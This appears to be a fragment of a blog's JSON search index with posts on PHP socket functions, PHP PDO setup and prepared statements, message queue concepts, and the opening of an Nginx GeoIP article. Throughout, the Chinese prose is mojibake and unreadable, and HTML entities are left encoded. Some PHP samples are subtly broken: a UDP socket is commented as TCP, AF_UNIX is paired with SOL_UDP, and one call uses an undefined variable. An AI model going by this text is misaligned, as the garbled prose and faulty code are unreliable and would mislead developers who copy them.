åˆ›å»ºè¿æ¥åˆ›å»ºå¹¶è¿”å›ä¸€ä¸ªå¥—æ¥å­—ï¼Œä¹Ÿç§°ä½œä¸€ä¸ªé€šè®¯èŠ‚ç‚¹ã€‚ä¸€ä¸ªå…¸å‹çš„ç½‘ç»œè¿æ¥ç”± 2 ä¸ªå¥—æ¥å­—æ„æˆï¼Œä¸€ä¸ªè¿è¡Œåœ¨å®¢æˆ·ç«¯ï¼Œå¦ä¸€ä¸ªè¿è¡Œåœ¨æœåŠ¡ç«¯ã€‚ 123456&lt;?php# åˆ›å»ºä¸€ä¸ªTCP åè®®çš„ socket$socket &#x3D; socket_create(AF_INET, SOCK_DGRAM, SOL_UDP);# åˆ›å»ºä¸€ä¸ªæœ¬åœ°çš„socket$socket &#x3D; socket_create(AF_UNIX, SOCK_STREAM, 0); socket_createå‡½æ•°æ¥æ”¶ä¸‰ä¸ªå‚æ•°ï¼Œåˆ†åˆ«æ˜¯domainã€typeã€protocolã€‚ domainï¼šå½“å‰å¥—æ¥å­—ä½¿ç”¨ä»€ä¹ˆåè®® typeï¼šå½“å‰å¥—æ¥å­—çš„ç±»å‹ protocolï¼šè®¾ç½®æŒ‡å®š domain å¥—æ¥å­—ä¸‹çš„å…·ä½“åè®® å‘é€å†…å®¹å‘é€æ•°æ®æœ‰ä¸¤ç§æ–¹å¼ï¼š socket_sendï¼šå‘é€æ¶ˆæ¯è‡³å·²è¿æ¥çš„å®¢æˆ·ç«¯ã€‚ socket_sendtoï¼šå‘é€æ¶ˆæ¯è‡³å®¢æˆ·ç«¯ï¼Œæ— è®ºæ˜¯å¦è¿æ¥ã€‚123456789&lt;?php$sock &#x3D; socket_create(AF_UNIX, SOCK_DGRAM, SOL_UDP);$msg &#x3D; &quot;Ping !&quot;;$len &#x3D; strlen($msg);&#x2F;&#x2F; å‘æœ¬åœ° 1223 ç«¯å£å‘é€å†…å®¹socket_sendto($sock, $msg, $len, 0, &#39;127.0.0.1&#39;, 1223);socket_close($sock); æ¥æ”¶æ•°æ®æ¥æ”¶æ•°æ®ä¹Ÿæœ‰ä¸¤ç§æ–¹å¼ï¼š socket_recvï¼šä»å·²è¿æ¥çš„socket æ¥æ”¶æ•°æ® socket_recvfromï¼šä»socket æ¥æ”¶æ•°æ®ï¼Œæ— è®ºæ˜¯å¦è¿æ¥ 123456&lt;?php$sock &#x3D; socket_create(AF_UNIX, SOCK_DGRAM, SOL_UDP);# ä»æœ¬åœ° 1223 ç«¯å£è·å–å†…å®¹socket_recvfrom($socket, $buf, 1024, 0, &quot;127.0.0.1&quot;, 1223);var_dump($buf); &#x2F;&#x2F; Ping ! å‚è€ƒé“¾æ¥ ç®€å•ç†è§£Socket ä¸€ç¯‡ææ‡‚TCPã€HTTPã€Socketã€Socketè¿æ¥æ±  socket_create socket_sendto socket_bind","categories":[{"name":"PHP","slug":"PHP","permalink":"https://www.0x2beace.com/categories/PHP/"}],"tags":[{"name":"PHP","slug":"PHP","permalink":"https://www.0x2beace.com/tags/PHP/"},{"name":"Socket","slug":"Socket","permalink":"https://www.0x2beace.com/tags/Socket/"}]},{"title":"PHP PDO å¿«é€Ÿä¸Šæ‰‹","slug":"php-pdo-quick-start","date":"2020-10-13T23:51:48.000Z","updated":"2020-10-13T23:53:56.113Z","comments":true,"path":"php-pdo-quick-start/","link":"","permalink":"https://www.0x2beace.com/php-pdo-quick-start/","excerpt":"æœ€è¿‘ç”¨åˆ°äº† PHP PDOç›¸å…³çš„çŸ¥è¯†ï¼Œæ•´ç†æ€»ç»“ä¸€ä¸‹ã€‚","text":"æœ€è¿‘ç”¨åˆ°äº† PHP PDOç›¸å…³çš„çŸ¥è¯†ï¼Œæ•´ç†æ€»ç»“ä¸€ä¸‹ã€‚ PDO æ˜¯ä»€ä¹ˆï¼ŸPDOï¼ˆPHP Data Objectï¼‰ PHP æ•°æ®å¯¹è±¡ ï¼ˆPDOï¼‰ æ‰©å±•ä¸ºPHPè®¿é—®æ•°æ®åº“å®šä¹‰äº†ä¸€ä¸ªè½»é‡çº§çš„ä¸€è‡´æ¥å£ã€‚ PDO èƒ½åšä»€ä¹ˆï¼ŸPDO æä¾›äº†ä¸€ä¸ªæ•°æ®è®¿é—®æŠ½è±¡å±‚ï¼Œè¿™æ„å‘³ç€ï¼Œä¸ç®¡ä½¿ç”¨å“ªç§æ•°æ®åº“ï¼Œéƒ½å¯ä»¥ç”¨ç›¸åŒçš„å‡½æ•°ï¼ˆæ–¹æ³•ï¼‰æ¥æŸ¥è¯¢å’Œè·å–æ•°æ®ã€‚ åœ¨ PHP ä½¿ç”¨ MySQL æ•°æ®åº“å‰ï¼Œä½ éœ€è¦å…ˆå°†å®ƒä»¬è¿æ¥ã€‚ PHP 5 åŠä»¥ä¸Šç‰ˆæœ¬æœ‰ä¸¤ç§æ–¹å¼è¿æ¥ MySQL : MySQLi extension (â€œiâ€ æ„ä¸º improved) PDO (PHP Data Objects) å…³äºæ˜¯é€‰æ‹© Mysqliï¼Œè¿˜æ˜¯ PDOï¼Ÿ MySQLi å’Œ PDO æœ‰å®ƒä»¬è‡ªå·±çš„ä¼˜åŠ¿ï¼šPDO åº”ç”¨åœ¨ 12 ç§ä¸åŒæ•°æ®åº“ä¸­ï¼Œ MySQLi åªé’ˆå¯¹ MySQL æ•°æ®åº“ã€‚ å¦‚æœé¡¹ç›®éœ€è¦åœ¨å¤šç§æ•°æ®åº“ä¸­åˆ‡æ¢ï¼Œå»ºè®®ä½¿ç”¨ PDOï¼Œå› ä¸ºåªéœ€è¦ä¿®æ”¹è¿æ¥å­—ç¬¦ä¸²å’Œéƒ¨åˆ†æŸ¥è¯¢è¯­å¥å³å¯ã€‚ PDO å®‰è£…åœ¨ PHP5 ç³»åˆ—ç‰ˆæœ¬ä¸­ï¼ŒPDOä¸æ˜¯é»˜è®¤æ”¯æŒçš„ï¼Œéœ€è¦æ‰‹å·¥é…ç½®æ‰å¯ä»¥ä½¿ç”¨ã€‚æ‰“å¼€ php.ini æ–‡ä»¶ï¼Œå¼€å¯æ‰©å±•ã€‚ 123&#x2F;&#x2F; php.iniextension&#x3D;php_pdo.dllextension&#x3D;php_pdo_mysql.dll ä¸Šè¿°é…ç½®åªæ‰“å¼€äº†å¯¹ MySQL çš„ PDO æ”¯æŒï¼Œå¦‚æœéœ€è¦å¯¹åˆ«çš„æ•°æ®åº“ç±»å‹è¿›è¡Œæ”¯æŒï¼Œå¯ä»¥åˆ†åˆ«æ‰“å¼€å¯¹åº”çš„ä¸åŒé…ç½®ï¼ˆå»æ‰å‰é¢çš„åˆ†å·ï¼‰ï¼š 12345;extension&#x3D;php_pdo_oci.dll;extension&#x3D;php_pdo_oci8.dll;extension&#x3D;php_pdo_odbc.dll;extension&#x3D;php_pdo_pgsql.dll;extension&#x3D;php_pdo_sqlite.dll PDO åˆ›å»ºè¿æ¥åœ¨ä½¿ç”¨ PDO æ“ä½œæ•°æ®åº“ä¹‹å‰ï¼Œéœ€è¦åˆ›å»º PDO è¿æ¥å¯¹è±¡ã€‚ 1234new PDO(DSN, username, password);&lt;?php$dsn &#x3D; &quot;mysql:host&#x3D;localhost; dbname&#x3D;databasename&quot;;$stmt &#x3D; new PDO($dsn, &#39;user&#39;, &#39;pwd&#39;); ä¸åŒçš„æ•°æ®åº“ï¼Œå…¶ DSN(Data Source Name) æ„é€ æ–¹å¼æ˜¯ä¸ä¸€æ ·çš„ã€‚å¸¸è§æ•°æ®åº“ DSN è¯­æ³•å¦‚ä¸‹ï¼š 12345678&#x2F;&#x2F;MySQL:$dsn &#x3D; mysql:host&#x3D;hostname;dbname&#x3D;db_name)&#x2F;&#x2F;SQLite:$dsn &#x3D; sqlite:db_name&#x2F;&#x2F;PGSQL$dsn pgsql:host&#x3D;hostname port&#x3D;port_id dbname&#x3D;db_name user&#x3D;username password&#x3D;password PDO Mysql é¢„å¤„ç†è¯­å¥é¢„å¤„ç†è¯­å¥åŠç»‘å®šå‚æ•°é¢„å¤„ç†è¯­å¥ç”¨äºæ‰§è¡Œå¤šä¸ªç›¸åŒçš„ SQL è¯­å¥ï¼Œå¹¶ä¸”æ‰§è¡Œæ•ˆç‡æ›´é«˜ã€‚ é¢„å¤„ç†è¯­å¥çš„å·¥ä½œåŸç†å¦‚ä¸‹ï¼š é¢„å¤„ç†ï¼šåˆ›å»º SQL è¯­å¥æ¨¡æ¿å¹¶å‘é€åˆ°æ•°æ®åº“ã€‚é¢„ç•™çš„å€¼ä½¿ç”¨å‚æ•° â€œ?â€ æ ‡è®° ã€‚ä¾‹å¦‚ï¼šINSERT INTO MyGuests (firstname, lastname, email) VALUES(?, ?, ?) æ•°æ®åº“è§£æï¼Œç¼–è¯‘ï¼Œå¯¹SQLè¯­å¥æ¨¡æ¿æ‰§è¡ŒæŸ¥è¯¢ä¼˜åŒ–ï¼Œå¹¶å­˜å‚¨ç»“æœä¸è¾“å‡º æ‰§è¡Œï¼šæœ€åï¼Œå°†åº”ç”¨ç»‘å®šçš„å€¼ä¼ é€’ç»™å‚æ•°ï¼ˆâ€?â€ æ ‡è®°ï¼‰ï¼Œæ•°æ®åº“æ‰§è¡Œè¯­å¥ã€‚åº”ç”¨å¯ä»¥å¤šæ¬¡æ‰§è¡Œè¯­å¥ï¼Œå¦‚æœå‚æ•°çš„å€¼ä¸ä¸€æ ·ã€‚ ç›¸æ¯”äºç›´æ¥æ‰§è¡ŒSQLè¯­å¥ï¼Œé¢„å¤„ç†è¯­å¥æœ‰ä¸¤ä¸ªä¸»è¦ä¼˜ç‚¹ï¼š é¢„å¤„ç†è¯­å¥å¤§å¤§å‡å°‘äº†åˆ†ææ—¶é—´ï¼Œåªåšäº†ä¸€æ¬¡æŸ¥è¯¢ï¼ˆè™½ç„¶è¯­å¥å¤šæ¬¡æ‰§è¡Œï¼‰ ç»‘å®šå‚æ•°å‡å°‘äº†æœåŠ¡å™¨å¸¦å®½ï¼Œä½ åªéœ€è¦å‘é€æŸ¥è¯¢çš„å‚æ•°ï¼Œè€Œä¸æ˜¯æ•´ä¸ªè¯­å¥ é¢„å¤„ç†è¯­å¥é’ˆå¯¹SQLæ³¨å…¥æ˜¯éå¸¸æœ‰ç”¨çš„ï¼Œå› ä¸º å‚æ•°å€¼å‘é€åä½¿ç”¨ä¸åŒçš„åè®®ï¼Œä¿è¯äº†æ•°æ®çš„åˆæ³•æ€§ã€‚ PDOçš„ç›´æ¥æŸ¥è¯¢å’Œé¢„å¤„ç†åˆ†åˆ«æ˜¯PDO çš„ queryç±»å’Œ prepare ç±»ã€‚ PDO::prepare â€” å¤‡è¦æ‰§è¡Œçš„SQLè¯­å¥å¹¶è¿”å›ä¸€ä¸ª PDOStatement å¯¹è±¡ PDO::query â€” æ‰§è¡Œ SQL è¯­å¥ï¼Œè¿”å›PDOStatementå¯¹è±¡,å¯ä»¥ç†è§£ä¸ºç»“æœé›† å‰è€…å…¶å®å°±æ˜¯æ‰§è¡Œ sql è¯­å¥ï¼Œè¿”å›ä¸€ä¸ªç»“æœé›†å¯¹è±¡ï¼ˆPDOStatementï¼‰ï¼Œç„¶åæ“ä½œ PDOStatementç±»ï¼Œä»ç»“æœé›†ä¸­å–å‡ºç›¸åº”çš„æ•°æ®ã€‚ åè€…è™½ç„¶ä¹Ÿä¼šè¿”å›ä¸€ä¸ª PDOSTatement å¯¹è±¡ï¼Œä½†åŒºåˆ«å°±åœ¨äºä¸¤è€…çš„å¤„ç†æ–¹å¼ä¸åŒã€‚query æ˜¯ç›´æ¥æ‰§è¡Œ sql è¯­å¥ï¼Œè€Œ prepare æ˜¯é€šè¿‡é¢„å¤„ç†çš„æ–¹å¼æ‰§è¡Œ sql è¯­å¥ï¼ˆæ›´å®‰å…¨ï¼Œæ›´é«˜æ•ˆï¼‰ã€‚ é”™è¯¯å¤„ç†PDO é»˜è®¤å¼€å¯çš„æ˜¯é”™è¯¯ç æ¨¡å¼ï¼Œå¦‚æœå‘ç”Ÿäº†é”™è¯¯ï¼Œåªä¼šç®€å•åœ°è¾“å‡ºé”™è¯¯ç ï¼Œè¿™å¯¹äºè°ƒè¯•æˆ–è€…æµ‹è¯•æ¥è¯´ï¼Œä¸æ˜¯å¾ˆå‹å¥½ï¼Œä¸åˆ©ç”¨å¿«é€Ÿå®šä½å¼‚å¸¸æ‰€åœ¨ã€‚ æ‰€ä»¥PDO è¿˜ä¸ºæˆ‘ä»¬æä¾›äº†å¦å¤–ä¸¤ç§æ–¹å¼ï¼š PDO::ERRMODE_WARNINGé™¤è®¾ç½®é”™è¯¯ç ä¹‹å¤–ï¼ŒPDO è¿˜å°†å‘å‡ºä¸€æ¡ä¼ ç»Ÿçš„ E_WARNING ä¿¡æ¯ã€‚å¦‚æœåªæ˜¯æƒ³çœ‹çœ‹å‘ç”Ÿäº†ä»€ä¹ˆé—®é¢˜ä¸”ä¸ä¸­æ–­åº”ç”¨ç¨‹åºçš„æµç¨‹ï¼Œé‚£ä¹ˆæ­¤è®¾ç½®åœ¨è°ƒè¯•/æµ‹è¯•æœŸé—´éå¸¸æœ‰ç”¨ã€‚ PDO::ERRMODE_EXCEPTIONé™¤è®¾ç½®é”™è¯¯ç ä¹‹å¤–ï¼ŒPDO è¿˜å°†æŠ›å‡ºä¸€ä¸ª PDOException å¼‚å¸¸ç±»å¹¶è®¾ç½®å®ƒçš„å±æ€§æ¥åå°„é”™è¯¯ç å’Œé”™è¯¯ä¿¡æ¯ã€‚æ­¤è®¾ç½®åœ¨è°ƒè¯•æœŸé—´ä¹Ÿéå¸¸æœ‰ç”¨ï¼Œå› ä¸ºå®ƒä¼šæœ‰æ•ˆåœ°æ”¾å¤§è„šæœ¬ä¸­äº§ç”Ÿé”™è¯¯çš„ç‚¹ï¼Œä»è€Œå¯ä»¥éå¸¸å¿«é€Ÿåœ°æŒ‡å‡ºä»£ç ä¸­æœ‰é—®é¢˜çš„æ½œåœ¨åŒºåŸŸï¼ˆè®°ä½ï¼šå¦‚æœå¼‚å¸¸å¯¼è‡´è„šæœ¬ç»ˆæ­¢ï¼Œåˆ™äº‹åŠ¡è¢«è‡ªåŠ¨å›æ»šï¼‰ã€‚ åˆ›å»º PDO å®ä¾‹å¹¶è®¾ç½®é”™è¯¯æ¨¡å¼ï¼š 1234567891011121314&lt;?php$dsn &#x3D; &#39;mysql:dbname&#x3D;testdb;host&#x3D;127.0.0.1&#39;;$user &#x3D; &#39;dbuser&#39;;$password &#x3D; &#39;dbpass&#39;;try &#123; $dbh &#x3D; new PDO($dsn, $user, $password); &#x2F;&#x2F; å¼€å¯ERRMODE_EXCEPTION æ¨¡å¼ $dbh-&gt;setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);&#125; catch (PDOException $e) &#123; echo &#39;Connection failed: &#39; . $e-&gt;getMessage();&#125;?&gt; å‚è€ƒé“¾æ¥ï¼š PHP PDO PHP PDO-&gt;queryç±» PHP Mysql é¢„å¤„ç†è¯­å¥ PHP å¤šç§æ–¹å¼è¿æ¥Mysql","categories":[{"name":"PHP","slug":"PHP","permalink":"https://www.0x2beace.com/categories/PHP/"}],"tags":[{"name":"PHP","slug":"PHP","permalink":"https://www.0x2beace.com/tags/PHP/"},{"name":"PDO","slug":"PDO","permalink":"https://www.0x2beace.com/tags/PDO/"}]},{"title":"æ¶ˆæ¯é˜Ÿåˆ—å¿«é€Ÿä¸Šæ‰‹","slug":"quick-start-message-queue","date":"2020-10-11T12:03:16.000Z","updated":"2021-06-27T10:36:38.704Z","comments":true,"path":"quick-start-message-queue/","link":"","permalink":"https://www.0x2beace.com/quick-start-message-queue/","excerpt":"ä¸šåŠ¡åœºæ™¯æè¿°ï¼š è®¢å•åˆ›å»ºæˆåŠŸä¹‹åï¼Œæ¯ä¸€ç¬”è®¢å•éƒ½éœ€è¦è¿›è¡Œç»Ÿè®¡åŠå…¶ä»–ä¸šåŠ¡å¤„ç†ã€‚ å¦‚ä½•åŠæ—¶å‘ç°å¤„ç†å¤±è´¥çš„è®¢å•ï¼Œç„¶åè¿›è¡Œè¡¥å•å¤„ç†ã€‚ è®¢å•æ‰€äº§ç”Ÿä½£é‡‘çš„å¤„ç†ã€‚","text":"ä¸šåŠ¡åœºæ™¯æè¿°ï¼š è®¢å•åˆ›å»ºæˆåŠŸä¹‹åï¼Œæ¯ä¸€ç¬”è®¢å•éƒ½éœ€è¦è¿›è¡Œç»Ÿè®¡åŠå…¶ä»–ä¸šåŠ¡å¤„ç†ã€‚ å¦‚ä½•åŠæ—¶å‘ç°å¤„ç†å¤±è´¥çš„è®¢å•ï¼Œç„¶åè¿›è¡Œè¡¥å•å¤„ç†ã€‚ è®¢å•æ‰€äº§ç”Ÿä½£é‡‘çš„å¤„ç†ã€‚ å›°å¢ƒè¯¥åº”ç”¨å› ä¸ºä¸€äº›å†å²åŸå› ä½¿ç”¨ Mysql çš„æ•°æ®è¡¨ä½œä¸ºæ¶ˆæ¯é˜Ÿåˆ—ã€‚ æ•´ä¸ªç³»ç»Ÿä¸­æœ‰å¤šä¸ªç”Ÿäº§è€…ä¼šå‘è¯¥æ•°æ®è¡¨ä¸­æ’å…¥è®°å½•ï¼ŒåŒæ—¶æœ‰ä¸€ä¸ªè„šæœ¬ä¼šä½œä¸ºæ¶ˆè´¹è€…å»æ•°æ®åº“ä¸­æŸ¥æ‰¾è®°å½•å¹¶æ¶ˆè´¹ã€‚ ä½†æ˜¯è¿™æ ·åšæ˜¯å­˜åœ¨å¾ˆå¤šé—®é¢˜ï¼š é•¿æ—¶é—´ä¸æ•°æ®åº“ä¿æŒè¿æ¥è¿›è¡ŒæŸ¥è¯¢æ“ä½œï¼Œæ¶ˆè€—æœåŠ¡å™¨èµ„æºã€‚ åœ¨æ•°æ®é‡è¾ƒå¤§æˆ–è€…å»¶æ—¶è¾ƒé«˜çš„æƒ…å†µä¸‹ï¼Œä¸èƒ½åŠæ—¶å¤„ç†å®Œï¼Œä¼šå½±å“å…¶ä»–ä¸šåŠ¡ã€‚ â€¦ æ‰€ä»¥æ›´å¥½çš„æ–¹å¼åº”è¯¥æ˜¯ä½¿ç”¨æ¶ˆæ¯é˜Ÿåˆ—æ¥è§£å†³ã€‚ ä»€ä¹ˆæ˜¯æ¶ˆæ¯é˜Ÿåˆ—ï¼Ÿæ¶ˆæ¯é˜Ÿåˆ—ï¼ˆMessage Queueï¼‰ï¼Œæ˜¯åˆ†å¸ƒå¼ç³»ç»Ÿä¸­é‡è¦çš„ç»„ä»¶ï¼Œå…¶é€šç”¨çš„ä½¿ç”¨åœºæ™¯å¯ä»¥ç®€å•åœ°æè¿°ä¸ºï¼š å½“ä¸éœ€è¦ç«‹å³è·å¾—ç»“æœï¼Œä½†æ˜¯å¹¶å‘é‡åˆéœ€è¦è¿›è¡Œæ§åˆ¶çš„æ—¶å€™ï¼Œå·®ä¸å¤šå°±æ˜¯éœ€è¦ä½¿ç”¨æ¶ˆæ¯é˜Ÿåˆ—çš„æ—¶å€™ã€‚ å¸¸è§åº”ç”¨åœºæ™¯å…¶å¸¸è§çš„åº”ç”¨åœºæ™¯æœ‰ä»¥ä¸‹å‡ ä¸ªï¼š åº”ç”¨è€¦åˆï¼šå¤šåº”ç”¨é—´é€šè¿‡æ¶ˆæ¯é˜Ÿåˆ—å¯¹åŒä¸€æ¶ˆæ¯è¿›è¡Œå¤„ç†ï¼Œé¿å…è°ƒç”¨æ¥å£å¤±è´¥å¯¼è‡´æ•´ä¸ªè¿‡ç¨‹å¤±è´¥ï¼› å¼‚æ­¥å¤„ç†ï¼šå¤šåº”ç”¨å¯¹æ¶ˆæ¯é˜Ÿåˆ—ä¸­åŒä¸€æ¶ˆæ¯è¿›è¡Œå¤„ç†ï¼Œåº”ç”¨é—´å¹¶å‘å¤„ç†æ¶ˆæ¯ï¼Œç›¸æ¯”ä¸²è¡Œå¤„ç†ï¼Œå‡å°‘å¤„ç†æ—¶é—´ï¼› é™æµå‰Šå³°ï¼šå¹¿æ³›åº”ç”¨äºç§’æ€æˆ–æŠ¢è´­æ´»åŠ¨ä¸­ï¼Œé¿å…æµé‡è¿‡å¤§å¯¼è‡´åº”ç”¨ç³»ç»ŸæŒ‚æ‰çš„æƒ…å†µï¼› æ¶ˆæ¯é©±åŠ¨çš„ç³»ç»Ÿï¼šç³»ç»Ÿåˆ†ä¸ºæ¶ˆæ¯é˜Ÿåˆ—ã€æ¶ˆæ¯ç”Ÿäº§è€…ã€æ¶ˆæ¯æ¶ˆè´¹è€…ï¼Œç”Ÿäº§è€…è´Ÿè´£äº§ç”Ÿæ¶ˆæ¯ï¼Œæ¶ˆè´¹è€…(å¯èƒ½æœ‰å¤šä¸ª)è´Ÿè´£å¯¹æ¶ˆæ¯è¿›è¡Œå¤„ç†ï¼› 1. å¼‚æ­¥å¤„ç†åœºæ™¯æè¿°ï¼šç”¨æˆ·æ³¨å†Œä¹‹åï¼Œéœ€è¦é‚®ç®±æˆ–è€…çŸ­ä¿¡é€šçŸ¥ï¼Œä¼ ç»Ÿçš„åšæ³•æœ‰ä¸¤ç§ï¼š ä¸²è¡Œï¼š æ³¨å†ŒæˆåŠŸ å‘é€é‚®ä»¶ å‘é€çŸ­ä¿¡ åªæœ‰ç­‰ä»¥ä¸Šä¸‰ä¸ªä»»åŠ¡å…¨éƒ¨å®Œæˆä¹‹åï¼Œæ‰ä¼šè¿”å›å®¢æˆ·ç«¯ã€‚ å¹¶è¡Œï¼š æ³¨å†ŒæˆåŠŸ å‘é€é‚®ä»¶å¹¶åŒæ—¶å‘é€çŸ­ä¿¡ è™½ç„¶ä¹Ÿæ˜¯éœ€è¦ä»¥ä¸Šä¸‰ä¸ªä»»åŠ¡å…¨éƒ¨å®Œæˆæ‰ä¼šè¿”å›å®¢æˆ·ç«¯ï¼Œä½†å¹¶è¡Œä¸ä¸²è¡Œçš„åŒºåˆ«å°±åœ¨äºï¼Œé€šè¿‡ä½¿ç”¨å¤šçº¿ç¨‹æ¥ç¼©çŸ­ç¨‹åºå¤„ç†æ—¶é—´ã€‚ å‡è®¾ä¸‰ä¸ªä¸šåŠ¡èŠ‚ç‚¹æ¯ä¸ªä½¿ç”¨50æ¯«ç§’é’Ÿï¼Œä¸è€ƒè™‘ç½‘ç»œç­‰å…¶ä»–å¼€é”€ï¼Œåˆ™ä¸²è¡Œæ–¹å¼çš„æ—¶é—´æ˜¯150æ¯«ç§’ï¼Œå¹¶è¡Œçš„æ—¶é—´å¯èƒ½æ˜¯100æ¯«ç§’ã€‚ å› ä¸ºCPUåœ¨å•ä½æ—¶é—´å†…å¤„ç†çš„è¯·æ±‚æ•°æ˜¯ä¸€å®šçš„ï¼Œå‡è®¾CPU1ç§’å†…ååé‡æ˜¯100æ¬¡ã€‚åˆ™ä¸²è¡Œæ–¹å¼1ç§’å†…CPUå¯å¤„ç†çš„è¯·æ±‚é‡æ˜¯7æ¬¡ï¼ˆ1000/150ï¼‰ã€‚å¹¶è¡Œæ–¹å¼å¤„ç†çš„è¯·æ±‚é‡æ˜¯10æ¬¡ï¼ˆ1000/100ï¼‰ã€‚ å°±è¯¥åœºæ™¯è€Œè¨€ï¼Œå¦‚ä½•çªç ´ä¼ ç»Ÿæ–¹å¼å¸¦æ¥çš„æ€§èƒ½ç“¶é¢ˆï¼Ÿ è§£å†³æ–¹æ¡ˆï¼š å¼•å…¥æ¶ˆæ¯é˜Ÿåˆ— å°†ä¸æ˜¯å¿…é¡»çš„ä¸šåŠ¡é€»è¾‘ï¼ŒåŠ å…¥é˜Ÿåˆ—ä¸­ï¼Œè¿›è¡Œå¼‚æ­¥å¤„ç†ã€‚ 2. åº”ç”¨è§£è€¦æ¶ˆæ¯é˜Ÿåˆ—æ¨¡å¼æ¶ˆæ¯é˜Ÿåˆ—åŒ…æ‹¬ä¸¤ç§æ¨¡å¼ï¼Œç‚¹å¯¹ç‚¹æ¨¡å¼ï¼ˆpoint to pointï¼Œ queueï¼‰å’Œå‘å¸ƒ/è®¢é˜…æ¨¡å¼ï¼ˆpublish/subscribeï¼Œtopicï¼‰ã€‚ ç‚¹å¯¹ç‚¹æ¨¡å¼ç‚¹å¯¹ç‚¹æ¨¡å¼åŒ…æ‹¬ä»¥ä¸‹ä¸‰ä¸ªè§’è‰²ï¼š æ¶ˆæ¯é˜Ÿåˆ— ç”Ÿäº§è€… æ¶ˆè´¹è€… ç”Ÿäº§è€…å°†æ¶ˆæ¯å‘é€åˆ°é˜Ÿåˆ—ä¸­ï¼Œæ¶ˆè´¹è€…ä»é˜Ÿåˆ—ä¸­å–å‡ºæ¶ˆæ¯è¿›è¡Œæ¶ˆè´¹ï¼Œæ¶ˆæ¯è¢«æ¶ˆè´¹ä¹‹åï¼Œæ¶ˆæ¯ä¸å†è¢«å­˜å‚¨ã€‚ ç‚¹å¯¹ç‚¹æ¨¡å¼çš„ç‰¹ç‚¹ï¼š æ¯ä¸ªæ¶ˆæ¯åªæœ‰ä¸€ä¸ªæ¥æ”¶è€…ï¼ˆConsumerï¼‰(å³ä¸€æ—¦è¢«æ¶ˆè´¹ï¼Œæ¶ˆæ¯å°±ä¸å†åœ¨æ¶ˆæ¯é˜Ÿåˆ—ä¸­)ã€‚ ç”Ÿäº§è€…å’Œæ¶ˆè´¹è€…ä¹‹é—´æ²¡æœ‰ä¾èµ–æ€§ï¼Œä¸ä¼šå› ä¸ºæ¶ˆè´¹è€…æ˜¯å¦åœ¨çº¿ï¼Œéƒ½ä¼šå­˜åœ¨äºé˜Ÿåˆ—ä¸­ã€‚ å‘å¸ƒ/è®¢é˜…æ¨¡å¼å‘å¸ƒ/è®¢é˜…æ¨¡å¼ä¸‹åŒ…æ‹¬ä¸‰ä¸ªè§’è‰²ï¼š é¢‘é“ å‘å¸ƒè€… è®¢é˜…è€… å‘å¸ƒè€…å°†æ¶ˆæ¯å‘å¸ƒåœ¨é¢‘é“ä¸­ï¼Œé¢‘é“å°†æ¶ˆæ¯ä¼ é€’ç»™æ‰€æœ‰è®¢é˜…è€…ã€‚ å‘å¸ƒ/è®¢é˜…æ¨¡å¼ç‰¹ç‚¹ï¼š æ¯ä¸ªæ¶ˆæ¯å¯ä»¥æœ‰å¤šä¸ªè®¢é˜…è€… å‘å¸ƒè€…å’Œè®¢é˜…è€…ä¹‹é—´å­˜åœ¨ä¾èµ–å…³ç³»ï¼Œå¿…é¡»å…ˆè®¢é˜…é¢‘é“ï¼Œå‘å¸ƒè€…å‘å¸ƒçš„æ¶ˆæ¯æ‰ä¼šè¢«è®¢é˜…è€…æ‰€æ¥æ”¶ã€‚ å› ä¸ºå‘å¸ƒçš„æ¶ˆæ¯æ˜¯æ— çŠ¶æ€çš„ï¼Œæ‰€ä»¥è®¢é˜…è€…éœ€è¦è®¢é˜…é¢‘é“ä¸”åœ¨çº¿ã€‚ å¸¸è§æ¶ˆæ¯é˜Ÿåˆ— RabbitMQ ActiveMQ RocketMQ Kafka Redis å‚è€ƒé“¾æ¥ ä¸ºä»€ä¹ˆä¼šéœ€è¦æ¶ˆæ¯é˜Ÿåˆ—(MQ)ï¼Ÿ PHP(Mysql/Redis)æ¶ˆæ¯é˜Ÿåˆ—çš„ä»‹ç»åŠåº”ç”¨åœºæ™¯æ¡ˆä¾‹ æ¶ˆæ¯é˜Ÿåˆ—åŠå¸¸è§æ¶ˆæ¯é˜Ÿåˆ—ä»‹ç» PHPå¤§é‡æ•°æ®å†™å…¥æ–‡æ¡£ï¼Œå¦‚ä½•å¼‚æ­¥å¤„ç†ï¼Ÿ","categories":[{"name":"MQ","slug":"MQ","permalink":"https://www.0x2beace.com/categories/MQ/"}],"tags":[{"name":"MQ","slug":"MQ","permalink":"https://www.0x2beace.com/tags/MQ/"}]},{"title":"Nginx å¦‚ä½•æ ¹æ® IP è·å–åœ°åŸŸä¿¡æ¯","slug":"how-does-nginx-obtain-geographic-information-based-on-ip","date":"2020-10-08T09:29:34.000Z","updated":"2020-10-11T12:01:45.888Z","comments":true,"path":"how-does-nginx-obtain-geographic-information-based-on-ip/","link":"","permalink":"https://www.0x2beace.com/how-does-nginx-obtain-geographic-information-based-on-ip/","excerpt":"æœ€è¿‘æœ‰ä¸€ä¸ªéœ€æ±‚ï¼šéœ€è¦æ ¹æ®ç”¨æˆ·çš„IP è·å–å…¶å›½å®¶ï¼Œç„¶åæ ¹æ®ä¸åŒå›½å®¶è¿›è¡Œä»£ç†è½¬å‘ã€‚","text":"æœ€è¿‘æœ‰ä¸€ä¸ªéœ€æ±‚ï¼šéœ€è¦æ ¹æ®ç”¨æˆ·çš„IP è·å–å…¶å›½å®¶ï¼Œç„¶åæ ¹æ®ä¸åŒå›½å®¶è¿›è¡Œä»£ç†è½¬å‘ã€‚ æƒ³è¦å®Œæˆè¿™ä¸ªéœ€æ±‚ï¼Œé¦–å…ˆç¬¬ä¸€ä¸ªè§£å†³çš„é—®é¢˜å°±æ˜¯è·å–IP åœ°å€æ‰€å¯¹åº”çš„åœ°ç†ä½ç½®ï¼š è¿™ä¸ªéœ€æ±‚é€šå¸¸æ˜¯ç”± GeoIP è¿™ä¸ªæ¨¡å—æ¥å®Œæˆçš„ï¼ŒNginx é»˜è®¤æ²¡æœ‰å¼€å¯è¯¥æ¨¡å—ã€‚ GeoIP æ˜¯åŸºäº maxmind æä¾›çš„æ•°æ®æ–‡ä»¶è¿›è¡Œåˆ†æçš„ï¼Œæ‰€ä»¥è¿˜éœ€è¦ä¸‹è½½ maxmind çš„æ•°æ®æºæ–‡ä»¶ã€‚ å®‰è£…GeoIP æ¨¡å—å‰é¢ä¹Ÿæåˆ°äº†MaxMind GeoLite Legacyæ•°æ®åº“ç›®å‰å·²åœäº§ï¼Œåº”æ”¹ç”¨MaxMind 